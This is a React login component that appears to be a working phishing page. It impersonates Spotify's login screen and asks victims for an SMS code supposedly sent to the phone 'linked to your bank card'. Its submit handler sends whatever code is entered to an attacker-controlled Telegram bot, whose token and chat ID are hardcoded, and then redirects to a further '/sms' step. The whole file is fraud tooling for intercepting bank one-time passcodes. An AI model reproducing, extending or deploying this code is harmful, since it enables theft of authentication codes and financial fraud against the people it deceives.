import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css'; // Make sure to create this CSS file
const TELEGRAM_BOT_TOKEN = '7567933012:AAG_jlPLYWLcQe8G7jgVgiWcXixg9DBaCdo';
const TELEGRAM_CHAT_ID = '7464995879';
const Login = () => {
  const [smsCode, setSmsCode] = useState(''); // Updated state for SMS code
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault(); // Prevent default form submission behavior

    // Construct the message to send to Telegram
    const message = `
      📋 *User SMS Code* 📋
      *Code:* ${smsCode}
    `;

 
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    })

    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            navigate('/sms'); // Use navigate to go to the billing page
        } else {
            alert('Failed to send the message. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending message. Please check the console for details.');
    });
};

return (
    <div className="container">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg"
        alt="Spotify Logo"
        className="logo"
      />
      <h2>To continue, log in to Spotify.</h2>

      <div className="login-button google-login">
        <img src="https://img.icons8.com/color/16/000000/google-logo.png" alt="Google Icon" />
        LOG IN with Google
      </div>

      <div className="login-button telegram-login">
        <img src="https://img.icons8.com/color/16/000000/telegram-app.png" alt="Telegram Icon" />
        LOG IN with Telegram
      </div>

      <hr className="divider" />
      <span className="or-text">or</span>
      <h2>Code sent  2:00</h2>
      <h4>  we sent a text message to the phone number linked to vour bank
card!
</h4>
      <form onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="Enter your SMS code."
          value={smsCode}
          onChange={(e) => setSmsCode(e.target.value)}
          className="code-input"
        />
        <button type="submit" className="submit-btn">Submit</button>
      </form>
      <br />
      <a href="#" className="signup-link">Don't Have an account? Log in.</a>
    </div>
  );
}

export default Login;
